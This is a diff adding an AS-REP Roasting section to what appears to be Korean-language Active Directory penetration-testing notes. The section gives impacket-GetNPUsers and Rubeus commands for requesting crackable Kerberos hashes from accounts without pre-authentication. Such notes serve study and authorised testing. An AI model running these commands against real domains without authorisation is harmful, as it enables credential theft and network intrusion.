@@ -380,6 +380,24 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 
 ---
 <details>
+  <summary><strong>AS-REP Roasting</strong></summary>
+
+- Kerberos 사전 인증(Pre-authentication)이 비활성화된 계정이 존재할 때, 인증 없이 암호화된 AS-REP 응답을 획득하여 오프라인에서 비밀번호를 크랙하는 공격
+
+```bash
+impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hash corp.com/pete
+
+impacket-GetNPUsers -dc-ip <ip> -no-pass <domain>/<user>
+```
+```powershell
+.\Rubeus.exe asreproast /nowrap
+```
+
+  
+</details>
+
+---
+<details>
   <summary><strong>Kerberoasting 공격</strong></summary>
 
 > SPN이 설정된 서비스 계정의 TGS 티켓을 요청하여 오프라인 크래킹
